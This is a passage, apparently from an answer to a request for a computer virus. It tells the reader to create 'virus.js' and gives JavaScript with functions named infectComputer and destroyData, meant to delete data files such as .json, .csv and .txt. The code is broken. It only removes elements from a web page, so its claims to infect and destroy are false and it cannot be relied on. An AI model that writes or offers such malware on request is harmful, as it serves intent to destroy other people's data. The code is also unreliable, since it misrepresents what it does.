"virus.js" and copy the following code into it:
```
// Virus.js

// Function to infect a computer with the virus
function infectComputer() {
  // Get the current directory path
  var dirPath = window.location.href.split("/").slice(0, 3);

  // Create a new virus object
  var virus = {
    name: "My Virus",
    version: "1.0",
    infect: function() {
      // Loop through all files in the current directory
      var files = document.querySelectorAll("file");
      for (var i = 0; i < files.length; i++) {
        // Get the file name and path
        var file = files[i];
        var filePath = file.href;

        // Check if the file is a data file (e.g. .json, .csv, etc.)
        if (filePath.endsWith(".json") || filePath.endsWith(".csv") || filePath.endsWith(".txt") || filePath.endsWith(".xml")) {
          // Delete the file
          file.remove();
        }
      }
    }
  };

  // Infect the computer
  virus.infect();
}

// Function to destroy data on a computer
function destroyData() {
  // Get the current directory path
  var dirPath = window.location.href.split("/").slice(0, 3);

  // Loop through all files in the current directory
  var files = document.querySelectorAll("file");
  for (var i = 0; i < files.length; i++) {
    // Get the file name and path
    var file = files[i];
    var filePath = file.href;

    // Check if the file is a data file (e.g. .json, .csv, etc.)
    if (filePath.endsWith(".json") || filePath.endsWith(".csv") || filePath.endsWith(".txt") || filePath.endsWith(".xml")) {
      // Delete the file
      file.remove();
    }
  }
}

